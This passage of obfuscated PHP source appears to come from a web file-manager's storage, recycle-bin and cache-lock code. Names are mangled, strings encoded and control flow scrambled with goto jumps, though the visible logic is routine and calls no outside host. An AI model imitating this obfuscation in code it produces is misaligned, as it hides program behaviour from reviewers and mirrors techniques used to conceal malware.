$fîá‘Ğç‚Õ->targetSpaceUpdate($DğÎÎ†ŞŸ®[$DÊ´¥²•™ß[371]], $DğÎÎ†ŞŸ®[$DÊ´¥²•™ß[456]]); } goto b£è«»Êƒ´; b£è«»Êƒ´: } public function restore($eÑ˜­¬÷Ä = false) { goto E‡£¨Á‚°°; e‰¶ï¼£³‡: foreach ($c°¹ñÑê‡Ç as $F÷ä¨äàçÆ) { goto D¼×•³äØÔ; b×‘ÆÅ­êÇ: if ($eÑß©À™Òİ[$Fç¶ÎÀÖô[370]] == $Fç¶ÎÀÖô[83]) { $a‰ç“ÓÀ‡÷ = array($Fç¶ÎÀÖô[525] => array($Fç¶ÎÀÖô[483], $eÑß©À™Òİ[$Fç¶ÎÀÖô[459]] . $F÷ä¨äàçÆ . $Fç¶ÎÀÖô[484])); $cƒÆ¶æ­›->where($a‰ç“ÓÀ‡÷)->setField($Fç¶ÎÀÖô[397], 0); $this->restoreFolderChildren($F÷ä¨äàçÆ, $c°¹ñÑê‡Ç); } $this->where(array($Fç¶ÎÀÖô[369] => $F÷ä¨äàçÆ))->delete(); $cƒÆ¶æ­›->folderSizeReset($eÑß©À™Òİ[$Fç¶ÎÀÖô[461]]); goto f‘‹Á¢¥¦ó; D¼×•³äØÔ: if ($eÑ˜­¬÷Ä != !1 && !in_array($F÷ä¨äàçÆ, $eÑ˜­¬÷Ä)) { continue; } $eÑß©À™Òİ = $cƒÆ¶æ­›->sourceInfo($F÷ä¨äàçÆ); $fœ´¯·ˆİ« = $cƒÆ¶æ­›->sourceInfo($eÑß©À™Òİ[$Fç¶ÎÀÖô[461]]); goto FÅ‘Š§êæ; FÅ‘Š§êæ: if ($fœ´¯·ˆİ«[$Fç¶ÎÀÖô[397]] == $Fç¶ÎÀÖô[83]) { continue; } $cƒÆ¶æ­›->lockMoveStart($F÷ä¨äàçÆ); $this->recycleMove($F÷ä¨äàçÆ, 0); goto b×‘ÆÅ­êÇ; f‘‹Á¢¥¦ó: $EÛ³“ÏÔ‘Ø[] = $eÑß©À™Òİ[$Fç¶ÎÀÖô[461]]; if ($eÑß©À™Òİ[$Fç¶ÎÀÖô[370]] == $Fç¶ÎÀÖô[83]) { $EÛ³“ÏÔ‘Ø[] = $F÷ä¨äàçÆ; } $cƒÆ¶æ­›->lockMoveEnd($F÷ä¨äàçÆ); goto d£âß‹¯â¬; d£âß‹¯â¬: } $cƒÆ¶æ­›->updateModifyTime($EÛ³“ÏÔ‘Ø); goto f©Ë¤Å‰õ…; a…ÈÑÈË¼: $eÑ˜­¬÷Ä = $eÑ˜­¬÷Ä == !1 ? !1 : $eÑ˜­¬÷Ä; if (!$c°¹ñÑê‡Ç) { return !0; } $EÛ³“ÏÔ‘Ø = array(); goto e‰¶ï¼£³‡; E‡£¨Á‚°°: $Fç¶ÎÀÖô =& $_SERVER[Î¿—”òá]; $cƒÆ¶æ­› = Model($Fç¶ÎÀÖô[1110]); $c°¹ñÑê‡Ç = $this->listData(); goto a…ÈÑÈË¼; f©Ë¤Å‰õ…: } private function restoreFolderChildren($fºË¡¥“ÓÊ, $cØ šò’Ğö) { goto b¦Ì„Æ°ñ; cé«ˆ“‹º: foreach ($cØ šò’Ğö as $dğ»ÍÅÇ¾¸) { if ($dğ»ÍÅÇ¾¸ == $fºË¡¥“ÓÊ) { continue; } if (!$Bæà•¼Ô˜£->isParentOf($fºË¡¥“ÓÊ, $dğ»ÍÅÇ¾¸)) { continue; } $aÖË§˜›‘´ = $Bæà•¼Ô˜£->sourceInfo($dğ»ÍÅÇ¾¸); if ($aÖË§˜›‘´[$BœØ¸®’§[370]] == $BœØ¸®’§[83]) { $då‡½¿ôÆ¼[] = array($BœØ¸®’§[525] => array($BœØ¸®’§[483], $aÖË§˜›‘´[$BœØ¸®’§[459]] . $dğ»ÍÅÇ¾¸ . $BœØ¸®’§[484])); } else { $då‡½¿ôÆ¼[$BœØ¸®’§[369]][1][] = $dğ»ÍÅÇ¾¸; } } if (!$då‡½¿ôÆ¼[$BœØ¸®’§[369]][1]) { unset($då‡½¿ôÆ¼[$BœØ¸®’§[369]]); } if (!$då‡½¿ôÆ¼) { return; } goto e¬†¤¥ÙèØ; b¦Ì„Æ°ñ: $BœØ¸®’§ =& $_SERVER[Î¿—”òá]; $Bæà•¼Ô˜£ = Model($BœØ¸®’§[1110]); $då‡½¿ôÆ¼ = array($BœØ¸®’§[369] => array($BœØ¸®’§[7], array())); goto cé«ˆ“‹º; e¬†¤¥ÙèØ: $då‡½¿ôÆ¼[$BœØ¸®’§[369]][1] = array_unique($då‡½¿ôÆ¼[$BœØ¸®’§[369]][1]); $då‡½¿ôÆ¼[$BœØ¸®’§[907]] = $BœØ¸®’§[2179]; $Bæà•¼Ô˜£->where($då‡½¿ôÆ¼)->setField($BœØ¸®’§[397], 1); goto BÊä·çº“õ; BÊä·çº“õ: } private function recycleMove($B ÌòŠä†, $Fä°àá¿¤ = 1) { $aÅ ÇŒ‰Ò¬ =& $_SERVER[Î¿—”òá]; $E®Şµ§š•Ò = Model($aÅ ÇŒ‰Ò¬[1110]); $dÚÌ«„ò = Model($aÅ ÇŒ‰Ò¬[2358]); $a šˆÔÎ  = array($aÅ ÇŒ‰Ò¬[369] => $B ÌòŠä†); if ($Fä°àá¿¤) { $E®Şµ§š•Ò->where($a šˆÔÎ )->setField($aÅ ÇŒ‰Ò¬[397], 1); $dÚÌ«„ò->eventRecycle($B ÌòŠä†, $aÅ ÇŒ‰Ò¬[2359]); } else { $Fá–…Áôß‚ = $E®Şµ§š•Ò->where($a šˆÔÎ )->find(); $d˜‹™ĞáØ¦ = $Fá–…Áôß‚[$aÅ ÇŒ‰Ò¬[370]] == $aÅ ÇŒ‰Ò¬[83]; $A±½ÚéØ = $E®Şµ§š•Ò->fileNameAuto($Fá–…Áôß‚[$aÅ ÇŒ‰Ò¬[461]], $Fá–…Áôß‚[$aÅ ÇŒ‰Ò¬[28]], REPEAT_RENAME_FOLDER, $d˜‹™ĞáØ¦); if ($A±½ÚéØ != $Fá–…Áôß‚[$aÅ ÇŒ‰Ò¬[28]]) { $E®Şµ§š•Ò->rename($B ÌòŠä†, $A±½ÚéØ); } $E®Şµ§š•Ò->where($a šˆÔÎ )->setField($aÅ ÇŒ‰Ò¬[397], 0); $dÚÌ«„ò->eventRecycle($B ÌòŠä†, $aÅ ÇŒ‰Ò¬[2360]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\163\x74\157\x72\x61\147\x65\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x73\x69\172\145\115\x61\170", "\x73\x79\x73\x74\145\x6d", "\x64\x65\146\141\165\x6c\x74", "\144\162\x69\x76\x65\x72", "\143\157\156\x66\151\x67"); public function listData($F„„††‚ß = false, $cÙ¯ˆÇ‚‚¿ = "\155\x6f\144\151\x66\x79\x54\151\x6d\x65", $b©ğ‰‹âÊ‚ = false) { goto B¶“Ş ³ì; DŞäÑÑ„: foreach ($fñã„Ò¢ as $Eæº£©Èä÷ => $bèÁÄ¤’ø) { unset($fñã„Ò¢[$Eæº£©Èä÷][$EÅÖÀìÕ[6]]); $fñã„Ò¢[$Eæº£©Èä÷][$EÅÖÀìÕ[2083]] = 0; } $cí£›£ï…‡ = array_to_keyvalue($fñã„Ò¢, $EÅÖÀìÕ[33], $EÅÖÀìÕ[367]); $this->_listAppendSize($fñã„Ò¢, $cí£›£ï…‡); goto d—¨ÛñŠİ; B¶“Ş ³ì: $EÅÖÀìÕ =& $_SERVER[Î¿—”òá]; $fñã„Ò¢ = parent::listData($F„„††‚ß, $cÙ¯ˆÇ‚‚¿, $b©ğ‰‹âÊ‚); if ($F„„††‚ß) { return $fñã„Ò¢; } goto DŞäÑÑ„; d—¨ÛñŠİ: return $fñã„Ò¢; goto aˆ»ß©õÇ; aˆ»ß©õÇ: } public function _listAppendSize(&$ağ´¦ë·Í, $få•ƒë”ê) { $B”™‡ì¨³ë =& $_SERVER[Î¿—”òá]; if (!$få•ƒë”ê) { return; } $F”åº‡áî = $B”™‡ì¨³ë[2361] . implode($B”™‡ì¨³ë[47], $få•ƒë”ê) . $B”™‡ì¨³ë[2362]; $c´…å†öÊ« = Model($B”™‡ì¨³ë[715])->query($F”åº‡áî); $c´…å†öÊ« = array_to_keyvalue($c´…å†öÊ«, $B”™‡ì¨³ë[367], $B”™‡ì¨³ë[77]); foreach ($ağ´¦ë·Í as $A´„Íõø‡ò => $fêô‘‡µä) { $ağ´¦ë·Í[$A´„Íõø‡ò][$B”™‡ì¨³ë[2083]] = isset($c´…å†öÊ«[$fêô‘‡µä[$B”™‡ì¨³ë[367]]]) ? $c´…å†öÊ«[$fêô‘‡µä[$B”™‡ì¨³ë[367]]] : 0; } } public function getConfig($e…ÛÆÜ©ÇÂ) { $D•ÑóÁ”Ä¾ = parent::listData($e…ÛÆÜ©ÇÂ); return json_decode($D•ÑóÁ”Ä¾[$_SERVER[Î¿—”òá][6]], !0); } public function update($cçÀ Ì îß, $EµîÅãçŸö) { goto cªÈŠ†ŸÔ ; cªÈŠ†ŸÔ : $E’ß¾ÅõŒá =& $_SERVER[Î¿—”òá]; $cï³ƒ‹ ¥ = $EµîÅãçŸö[$E’ß¾ÅõŒá[28]]; $EÌÑè„” = array_to_keyvalue(parent::listData(), $E’ß¾ÅõŒá[28]); goto añ…¼†ÏÔĞ; añ…¼†ÏÔĞ: if (isset($EÌÑè„”[$cï³ƒ‹ ¥]) && $EÌÑè„”[$cï³ƒ‹ ¥][$E’ß¾ÅõŒá[367]] != $cçÀ Ì îß) { return !1; } if (isset($EµîÅãçŸö[$E’ß¾ÅõŒá[2363]]) && $EµîÅãçŸö[$E’ß¾ÅõŒá[2363]] == $E’ß¾ÅõŒá[83]) { $this->checkConfig($EµîÅãçŸö); } unset($EµîÅãçŸö[$E’ß¾ÅõŒá[2363]]); goto f‰ß‡³¯éÃ; f‰ß‡³¯éÃ: $BÔ¼šÎÜ‚ê = parent::update($cçÀ Ì îß, $EµîÅãçŸö); if ($BÔ¼šÎÜ‚ê && $EµîÅãçŸö[$E’ß¾ÅõŒá[34]]) { foreach ($EÌÑè„” as $b¡›îç–à«) { if ($b¡›îç–à«[$E’ß¾ÅõŒá[34]] && $b¡›îç–à«[$E’ß¾ÅõŒá[367]] != $cçÀ Ì îß) { parent::update($b¡›îç–à«[$E’ß¾ÅõŒá[367]], array($E’ß¾ÅõŒá[34] => 0)); } } } return $BÔ¼šÎÜ‚ê; goto c¨ÉÂ™ÈÚØ; c¨ÉÂ™ÈÚØ: } public function add($då°®º»¦Ø) { goto CÏ’Ø–†Á; A„Áç„…Á: $this->checkConfig($då°®º»¦Ø); $C‹®×ŞËÜÃ = parent::insert($då°®º»¦Ø); if ($C‹®×ŞËÜÃ && $då°®º»¦Ø[$b»›å‘Âë«[34]]) { foreach ($DŒô¼‹Ÿ­Ì as $b¥àì­êÆŒ) { if ($b¥àì­êÆŒ[$b»›å‘Âë«[34]]) { parent::update($b¥àì­êÆŒ[$b»›å‘Âë«[367]], array($b»›å‘Âë«[34] => 0)); } } } goto Déî‰Úá; CÏ’Ø–†Á: $b»›å‘Âë« =& $_SERVER[Î¿—”òá]; $DŒô¼‹Ÿ­Ì = array_to_keyvalue(parent::listData(), $b»›å‘Âë«[28]); if (isset($DŒô¼‹Ÿ­Ì[$då°®º»¦Ø[$b»›å‘Âë«[28]]])) { return !1; } goto A„Áç„…Á; Déî‰Úá: return $C‹®×ŞËÜÃ; goto eœ³ÙÛ†ïá; eœ³ÙÛ†ïá: } public function checkConfig(&$Dø„¬àó†ß) { goto f˜­óÄÉÈ‰; f˜­óÄÉÈ‰: $a™äŠô²¼ =& $_SERVER[Î¿—”òá]; $c…¬õĞ‹­ = strtolower($Dø„¬àó†ß[$a™äŠô²¼[90]]); $Fò¤Ã®‚ª† = json_decode($Dø„¬àó†ß[$a™äŠô²¼[6]], !0); goto BÀÇ‹ôšçâ; C‡…¹ëèÖ‰: $Fò¤Ã®‚ª†[$a™äŠô²¼[1017]] = $cÌĞËÀó‚¾; $Dø„¬àó†ß[$a™äŠô²¼[6]] = json_encode($Fò¤Ã®‚ª†); $Dø„¬àó†ß[$a™äŠô²¼[90]] = $CÖ„Ú‘è©ã; goto E±¨¬Ÿ†é£; BÀÇ‹ôšçâ: foreach ($Fò¤Ã®‚ª† as $e‘Œ†ÍáçÓ => $c´‹Ñ›Œ÷±) { $Fò¤Ã®‚ª†[$e‘Œ†ÍáçÓ] = trim($c´‹Ñ›Œ÷±); } $Fò¤Ã®‚ª†[$a™äŠô²¼[2364]] = rand_string(6); $CÖ„Ú‘è©ã = $this->driverType($c…¬õĞ‹­); goto EÒâƒñÏ‡Í; AÒµ¿‡Âó: $cÌĞËÀó‚¾ = rtrim($Fò¤Ã®‚ª†[$a™äŠô²¼[1017]], $a™äŠô²¼[8]) . $a™äŠô²¼[8]; $E¯Ç¦Êƒ‚™ = $DÑõ¼©ªŒİ->getPath($cÌĞËÀó‚¾ . $a™äŠô²¼[1978]); if (!$DÑõ¼©ªŒİ->mkfile($E¯Ç¦Êƒ‚™)) { show_json(LNG($a™äŠô²¼[2365]), !1); } goto C‡…¹ëèÖ‰; E±¨¬Ÿ†é£: return !0; goto Bâø©‰Î; EÒâƒñÏ‡Í: $Bá†ó‘®¿Ï = $a™äŠô²¼[71] . $CÖ„Ú‘è©ã; $DÑõ¼©ªŒİ = new $Bá†ó‘®¿Ï($Fò¤Ã®‚ª†); if (in_array($c…¬õĞ‹­, $DÑõ¼©ªŒİ->objectDriver)) { if (!$DÑõ¼©ªŒİ->isBucketCors() && !$DÑõ¼©ªŒİ->setBucketCors()) { $d‹ëÑ„˜„Ò = LNG($a™äŠô²¼[2365]); $d‹ëÑ„˜„Ò .= $a™äŠô²¼[2366] . LNG($a™äŠô²¼[2367]); show_json($d‹ëÑ„˜„Ò, !1); } } goto AÒµ¿‡Âó; Bâø©‰Î: } private function driverType($fĞ­¦¤ãÄ) { $C “àÛİË =& $_SERVER[Î¿—”òá]; $B´Ù†Æ›Û = array($C “àÛİË[102] => $C “àÛİË[2368], $C “àÛİË[58] => $C “àÛİË[2369], $C “àÛİË[64] => $C “àÛİË[2370]); if (isset($B´Ù†Æ›Û[$fĞ­¦¤ãÄ])) { return $B´Ù†Æ›Û[$fĞ­¦¤ãÄ]; } return strtoupper($fĞ­¦¤ãÄ); } public function driverListSystem() { $F ½‘†ÜÇé =& $_SERVER[Î¿—”òá]; $e¥–àÃŸ¾­ = parent::listData(); $A†”šöŠ¥è = array(); foreach ($e¥–àÃŸ¾­ as $Bº”¦²Ş˜‚) { unset($Bº”¦²Ş˜‚[$F ½‘†ÜÇé[187]], $Bº”¦²Ş˜‚[$F ½‘†ÜÇé[107]]); $Bº”¦²Ş˜‚[$F ½‘†ÜÇé[6]] = json_decode($Bº”¦²Ş˜‚[$F ½‘†ÜÇé[6]], !0); $A†”šöŠ¥è[] = $Bº”¦²Ş˜‚; } return $A†”šöŠ¥è; } public function defaultDriver() { $b‰¡ïÖ›— =& $_SERVER[Î¿—”òá]; $D­åšŠ¢ïè = parent::listData(); $d‹ŠÂÌÔé = array_filter_by_field($D­åšŠ¢ïè, $b‰¡ïÖ›—[34], 1); $d‹ŠÂÌÔé = $d‹ŠÂÌÔé[0]; if ($d‹ŠÂÌÔé) { $d‹ŠÂÌÔé[$b‰¡ïÖ›—[6]] = json_decode($d‹ŠÂÌÔé[$b‰¡ïÖ›—[6]], !0); } return $d‹ŠÂÌÔé; } public function driverInfo($aæ–•À¨É) { $dÎ•Š®¢¿ =& $_SERVER[Î¿—”òá]; $aã¸à—çÁ˜ = array_to_keyvalue(parent::listData(), $dÎ•Š®¢¿[367]); if (!isset($aã¸à—çÁ˜[$aæ–•À¨É])) { return !1; } $e­ößàåÖÅ = $aã¸à—çÁ˜[$aæ–•À¨É]; $e­ößàåÖÅ[$dÎ•Š®¢¿[6]] = json_decode($e­ößàåÖÅ[$dÎ•Š®¢¿[6]], !0); return $e­ößàåÖÅ; } public function remove($F™ªÎÛŞĞÎ) { $this->removeShareItems($F™ªÎÛŞĞÎ); return parent::remove($F™ªÎÛŞĞÎ); } public function removeWithFile($c£Œ½Äæ“”) { goto Eê•¸ìÓªÊ; a­µƒôèˆ: $AËÊ‰ôŠÀ->task[$aÂçˆ˜ğ•Š[694]] = (double) $D“ß£½ØœÁ; $aÜÛ§ñˆ² = KodIO::defaultDriver(); $Dë¡Ü˜¦õÕ = $aÜÛ§ñˆ²[$aÂçˆ˜ğ•Š[367]]; goto bà´”Ğ‚œï; F¾á×ÄšŞ½: $D“ß£½ØœÁ = Model($aÂçˆ˜ğ•Š[422])->where($dÇÖöô¨Ş…)->sum($aÂçˆ˜ğ•Š[77]); $D›°·ŸÃ³ = $aÂçˆ˜ğ•Š[2371] . $c£Œ½Äæ“”; $AËÊ‰ôŠÀ = new TaskFileTransfer($D›°·ŸÃ³, $aÂçˆ˜ğ•Š[2372], $cÑŠÆ‚÷ò, LNG($aÂçˆ˜ğ•Š[2373]) . "\x28{$c£Œ½Äæ“”}\x29"); goto a­µƒôèˆ; DäÂÄ¢­: if (!$B ä’İÍÏ) { $AËÊ‰ôŠÀ->stop($D›°·ŸÃ³); return !1; } $AËÊ‰ôŠÀ->end(); $this->remove($c£Œ½Äæ“”); goto dôéÁÕõ¹İ; Eê•¸ìÓªÊ: $aÂçˆ˜ğ•Š =& $_SERVER[Î¿—”òá]; $dÇÖöô¨Ş… = array($aÂçˆ˜ğ•Š[740] => $c£Œ½Äæ“”); $cÑŠÆ‚÷ò = Model($aÂçˆ˜ğ•Š[422])->where($dÇÖöô¨Ş…)->count(); goto F¾á×ÄšŞ½; bà´”Ğ‚œï: $DİŸ«Ñ»áÕ = "\173\x69\157\72{$Dë¡Ü˜¦õÕ}\x7d\57"; $B ä’İÍÏ = !0; $a¾‰·Á¬çÅ = array(); goto e­ŸƒÌÜ¼†; e­ŸƒÌÜ¼†: $C…ÛŠ©ë± = Model($aÂçˆ˜ğ•Š[167])->where($dÇÖöô¨Ş…)->field($aÂçˆ˜ğ•Š[2374])->select(); foreach ($C…ÛŠ©ë± as $b¨¸õÉæ‹à) { goto E‡ÔªïĞÌ; d¨Ó¤Ñœ³: $DÏ¼´éæÆï = array($aÂçˆ˜ğ•Š[740] => $Dë¡Ü˜¦õÕ, $aÂçˆ˜ğ•Š[75] => $fâµä»¯ˆ); Model($aÂçˆ˜ğ•Š[167])->where($dÇÖöô¨Ş…)->save($DÏ¼´éæÆï); goto DÖŞÖŠÒ; bùØä‡äÑá: if (IO::exist($fâµä»¯ˆ)) { $AËÊ‰ôŠÀ->updateFileEnd($b¨¸õÉæ‹à[$aÂçˆ˜ğ•Š[28]], $b¨¸õÉæ‹à[$aÂçˆ˜ğ•Š[77]]); continue; } if (!IO::move($f¦ÄåÀ–’, get_path_father($fâµä»¯ˆ))) { $B ä’İÍÏ = !1; break; } $dÇÖöô¨Ş… = array($aÂçˆ˜ğ•Š[419] => $b¨¸õÉæ‹à[$aÂçˆ˜ğ•Š[419]]); goto d¨Ó¤Ñœ³; E‡ÔªïĞÌ: $f¦ÄåÀ–’ = $b¨¸õÉæ‹à[$aÂçˆ˜ğ•Š[75]]; $fâµä»¯ˆ = $DİŸ«Ñ»áÕ . str_replace("\x7b\x69\157\72{$c£Œ½Äæ“”}\175\57", $aÂçˆ˜ğ•Š[33], $f¦ÄåÀ–’); if (!IO::exist($f¦ÄåÀ–’)) { $a¾‰·Á¬çÅ[] = $b¨¸õÉæ‹à[$aÂçˆ˜ğ•Š[419]]; $AËÊ‰ôŠÀ->updateFileEnd($b¨¸õÉæ‹à[$aÂçˆ˜ğ•Š[28]], $b¨¸õÉæ‹à[$aÂçˆ˜ğ•Š[77]]); continue; } goto bùØä‡äÑá; DÖŞÖŠÒ: } $this->removeByFileID($a¾‰·Á¬çÅ); goto DäÂÄ¢­; dôéÁÕõ¹İ: } public function progress($D«áæÂ½Å¨) { return Task::get($_SERVER[Î¿—”òá][2371] . $D«áæÂ½Å¨); } private function removeByFileID($F‹Í¦äìÎ = array()) { goto FÛè„“åö; böÑÁ¼œ˜”: $dºôŠÉ² = Model($Då¹ù´è¾¦[1110])->where($BÑø¢ƒ×)->field($Då¹ù´è¾¦[369])->select(); if (!$dºôŠÉ²) { return; } $dºôŠÉ² = array_to_keyvalue($dºôŠÉ², $Då¹ù´è¾¦[33], $Då¹ù´è¾¦[369]); goto BÆçÂä¸ÙÏ; BÆçÂä¸ÙÏ: foreach ($dºôŠÉ² as $cğîÍîìƒˆ) { Model($Då¹ù´è¾¦[382])->removeNow($cğîÍîìƒˆ, !1); } goto C¨‘•ë•á; FÛè„“åö: $Då¹ù´è¾¦ =& $_SERVER[Î¿—”òá]; if (empty($F‹Í¦äìÎ)) { return; } $BÑø¢ƒ× = array($Då¹ù´è¾¦[419] => array($Då¹ù´è¾¦[7], $F‹Í¦äìÎ)); goto böÑÁ¼œ˜”; C¨‘•ë•á: } private function removeShareItems($EĞ¨İŞÖ“ø) { goto d‡ñÙù¿ÄÛ; c™ ë¥ôøì: Model($BÉ–¦©²’Ğ[536])->remove($eÌĞ”‰„ˆ±); goto aª¥ì”¹Ş; d‡ñÙù¿ÄÛ: $BÉ–¦©²’Ğ =& $_SERVER[Î¿—”òá]; $bŠ›äÙ†´Â = "\173\151\x6f\x3a{$EĞ¨İŞÖ“ø}\x7d\x2f"; $E°×ï†ÆÉÆ = array($BÉ–¦©²’Ğ[369] => 0, $BÉ–¦©²’Ğ[1012] => array($BÉ–¦©²’Ğ[748], "{$bŠ›äÙ†´Â}\x25")); goto f­ÅáÃğ±‰; f­ÅáÃğ±‰: $fØ«ÖÁŒìÂ = Model($BÉ–¦©²’Ğ[2074])->where($E°×ï†ÆÉÆ)->field($BÉ–¦©²’Ğ[441])->select(); if (empty($fØ«ÖÁŒìÂ)) { return; } $eÌĞ”‰„ˆ± = array_to_keyvalue($fØ«ÖÁŒìÂ, $BÉ–¦©²’Ğ[33], $BÉ–¦©²’Ğ[441]); goto c™ ë¥ôøì; aª¥ì”¹Ş: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\114\x69\x67\x68\164\101\x70\160"; public $modelType = "\x53\x79\x73\x74\x65\155\x4f\x70\x74\x69\157\x6e"; public $field = array("\x6e\x61\155\145", "\147\162\x6f\165\160", "\144\145\163\x63", "\x63\x6f\x6e\x74\145\156\164"); public function listData($E¬àÉÚ°¯Ô = false, $d‡Ÿ¼‰“¿ = "\x6d\x6f\x64\151\x66\x79\124\x69\x6d\145", $E›öß‚ğƒ– = true) { return parent::listData($E¬àÉÚ°¯Ô, $d‡Ÿ¼‰“¿, $E›öß‚ğƒ–); } public function remove($D×ë–Ì«ø‡) { $aÊƒÅğñé = $this->findByName($D×ë–Ì«ø‡); if (!$aÊƒÅğñé) { return !1; } return parent::remove($aÊƒÅğñé[$_SERVER[Î¿—”òá][367]]); } public function add($Eá¼ÎÒéò) { if ($this->findByName($Eá¼ÎÒéò[$_SERVER[Î¿—”òá][28]])) { return !1; } return parent::insert($Eá¼ÎÒéò); } public function update($CÈÊğ‹•ª·, $c¥»¾øù „) { $DŸÔ ãä…× =& $_SERVER[Î¿—”òá]; $eÈóš—ÃÊ“ = $this->findByName($CÈÊğ‹•ª·); $dµ—±Ïëí‚ = $this->findByName($c¥»¾øù „[$DŸÔ ãä…×[28]]); if (!$eÈóš—ÃÊ“ || $dµ—±Ïëí‚ && $dµ—±Ïëí‚[$DŸÔ ãä…×[367]] != $eÈóš—ÃÊ“[$DŸÔ ãä…×[367]]) { return !1; } return parent::update($eÈóš—ÃÊ“[$DŸÔ ãä…×[367]], $c¥»¾øù „); } } goto Aî§­ÂêŠÈ; eéƒÙ¹ËÖ‹: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $b°ëø‰Ú‡Í =& $_SERVER[Î¿—”òá]; $eÜ³”ÏŠò = $GLOBALS[$b°ëø‰Ú‡Í[6]][$b°ëø‰Ú‡Í[337]]; self::$cachePath = $eÜ³”ÏŠò[$b°ëø‰Ú‡Í[167]][$b°ëø‰Ú‡Í[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($Fóğ”¿ë—ù, $b±·ëŠ—Ùª = 0) { goto fÛÎõ…‰‹; cÁ‡•ó‘Ç¨: $EˆùŒ„Úóä = rtrim(self::$cachePath, $A°˜ĞÁ‹ùˆ[8]) . $A°˜ĞÁ‹ùˆ[770] . md5($Fóğ”¿ë—ù) . $A°˜ĞÁ‹ùˆ[771]; if (file_exists($EˆùŒ„Úóä) && filemtime($EˆùŒ„Úóä) && filemtime($EˆùŒ„Úóä) < time() - 10) { @unlink($EˆùŒ„Úóä); } do { if (file_exists($EˆùŒ„Úóä)) { cacheLockWait(); continue; } $CÕ•¬Éºˆ = fopen($EˆùŒ„Úóä, $A°˜ĞÁ‹ùˆ[772]); if (!$CÕ•¬Éºˆ) { return !1; } $AÅõ“ ‡·  = flock($CÕ•¬Éºˆ, LOCK_EX | LOCK_NB); self::$caches[$Fóğ”¿ë—ù] = array($A°˜ĞÁ‹ùˆ[773] => $CÕ•¬Éºˆ, $A°˜ĞÁ‹ùˆ[167] => $EˆùŒ„Úóä); fwrite($CÕ•¬Éºˆ, $FÑ‚ĞõÈŠ¶); clearstatcache(); if ($CÕ•¬Éºˆ && $AÅõ“ ‡· ) { return !0; } cacheLockWait(); } while (microtime(!0) < $FÑ‚ĞõÈŠ¶); goto b‚ùÔìÂƒ; b‚ùÔìÂƒ: $this->unlock($Fóğ”¿ë—ù); return !1; goto eÙÒñ¯Šñ; fÛÎõ…‰‹: $A°˜ĞÁ‹ùˆ =& $_SERVER[Î¿—”òá]; $fÔõ­±ôß = microtime(!0); $FÑ‚ĞõÈŠ¶ = $fÔõ­±ôß + $b±·ëŠ—Ùª + 0.0001; goto cÁ‡•ó‘Ç¨; eÙÒñ¯Šñ: } public function lockGet($bá¼ß²¢¢£) { $BˆŠ¾ §« =& $_SERVER[Î¿—”òá]; $c«ÂË®Ù«Ì = rtrim(self::$cachePath, $BˆŠ¾ §«[8]) . $BˆŠ¾ §«[770] . md5($bá¼ß²¢¢£) . $BˆŠ¾ §«[771]; return file_exists($c«ÂË®Ù«Ì); } public function unlock($Aç”Ş¡Ì­’) { goto E©ÇõÌˆ‚; Fã÷¬„„À‹: @flock($F÷Õªíã—²[$bÍŸõšÎÕ[773]], LOCK_UN); @fclose($F÷Õªíã—²[$bÍŸõšÎÕ[773]]); @unlink($F÷Õªíã—²[$bÍŸõšÎÕ[167]]); goto cñÃ˜…õ…ï; cñÃ˜…õ…ï: unset(self::$caches[$Aç”Ş¡Ì­’]); goto d–Î“¸«‹ë; E©ÇõÌˆ‚: $bÍŸõšÎÕ =& $_SERVER[Î¿—”òá]; $F÷Õªíã—² = self::$caches[$Aç”Ş¡Ì­’]; if (!$F÷Õªíã—²) { return; } goto Fã÷¬„„À‹; d–Î“¸«‹ë: } } class CacheLockRedis { public function lock($fÁğÁ¸­·‘, $CóôÌÍïÅ¹ = 10) { $dÜ±š³®¹Ç = Cache::init(); $EÄğÉ¡‰Ù = microtime(!0) + $CóôÌÍïÅ¹; while (microtime(!0) < $EÄğÉ¡‰Ù) { $D£Ö‚…—  = $dÜ±š³®¹Ç->get($fÁğÁ¸­·‘); if (!$D£Ö‚…— ) { $CØ—ŠÃ°—Ä = $dÜ±š³®¹Ç->setLock($fÁğÁ¸­·‘, $EÄğÉ¡‰Ù, $CóôÌÍïÅ¹); if ($CØ—ŠÃ°—Ä) { return !0; } } else { if ($D£Ö‚…—  < microtime(!0)) { $dÜ±š³®¹Ç->set($fÁğÁ¸­·‘, $EÄğÉ¡‰Ù, $EÄğÉ¡‰Ù); if ($dÜ±š³®¹Ç->get($fÁğÁ¸­·‘) === $D£Ö‚…— ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($A›ß«Ó³¾) { return Cache::init()->get($A›ß«Ó³¾); } public function unlock($EÍä“†—ëÄ) { return Cache::init()->remove($EÍä“†—ëÄ); } } class CacheLockMemcached { public function lock($f¨„×À…•, $cØŸ“ï¸• = 0) { $cßí“½¤ÏÌ = Cache::init(); $bğ®òßó¿³ = microtime(!0) + $cØŸ“ï¸•; while (microtime(!0) < $bğ®òßó¿³) { $d¬˜§˜Ê‚ = $cßí“½¤ÏÌ->get($f¨„×À…•); if (!$d¬˜§˜Ê‚ || $d¬˜§˜Ê‚ < microtime(!0)) { $f¨Å¬§Îœ‘ = $cßí“½¤ÏÌ->handle->add($f¨„×À…•, $bğ®òßó¿³, $cØŸ“ï¸•); if ($f¨Å¬§Îœ‘) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($cÒÎ‰öŒ´») { return Cache::init()->get($cÒÎ‰öŒ´»); } public function unlock($CÃÎ¡¤Ü²) { return Cache::init()->remove($CÃÎ¡¤Ü²); } } goto Cµ´ËÔîÃ; f Ù©íÚ: class GetInfo { private static $fileTypeArray; public static function get($AÅğÉ´×Õ¶) { $FŸİªò…ö˜ = IO::info($AÅğÉ´×Õ¶); return self::infoAdd($FŸİªò…ö˜); } public static function infoAdd(&$a‹›¹¦š‡) { goto eÍº††ÕÁ; d¼î…Á«Å”: $Fî­Óƒù–«[$F°¢‡½ÄÉÂ[372]] = $eÄ¶õùÎ×Ù; $a‹›¹¦š‡[$F°¢‡½ÄÉÂ[426]] = $Fî­Óƒù–«; return $a‹›¹¦š‡; goto B‡¡ø™æ†¤; e²±¤Åºì: $eÄ¶õùÎ×Ù = $a‹›¹¦š‡[$F°¢‡½ÄÉÂ[160]]; try { if ($a‹›¹¦š‡[$F°¢‡½ÄÉÂ[160]] == 